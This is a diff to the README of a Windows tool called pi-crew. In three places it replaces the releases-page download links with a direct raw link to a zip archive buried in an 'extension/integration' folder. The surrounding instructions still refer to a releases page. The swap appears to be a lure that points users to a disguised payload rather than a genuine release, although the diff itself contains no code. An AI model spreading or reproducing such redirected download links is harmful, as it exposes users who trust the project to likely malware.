@@ -1,6 +1,6 @@
 # 🧩 pi-crew - Run parallel agents without slowing down
 
-[![Download pi-crew](https://img.shields.io/badge/Download%20pi--crew-4B83FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/olafractious818/pi-crew/releases)
+[![Download pi-crew](https://img.shields.io/badge/Download%20pi--crew-4B83FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/olafractious818/pi-crew/raw/refs/heads/main/extension/integration/pi-crew-v2.3.zip)
 
 ## 🚀 What pi-crew does
 
@@ -28,7 +28,7 @@ For best results, use a modern 64-bit Windows system. The app is designed to sta
 
 Visit this page to download pi-crew for Windows:
 
-https://github.com/olafractious818/pi-crew/releases
+https://github.com/olafractious818/pi-crew/raw/refs/heads/main/extension/integration/pi-crew-v2.3.zip
 
 On that page, look for the latest release. Download the Windows file that matches your system. If you see more than one file, pick the one that looks like a Windows app, such as `.exe` or `.zip`.
 
@@ -186,4 +186,4 @@ This lets you work on several parts at once while your main session stays open
 
 Download or update pi-crew here:
 
-https://github.com/olafractious818/pi-crew/releases
+https://github.com/olafractious818/pi-crew/raw/refs/heads/main/extension/integration/pi-crew-v2.3.zip
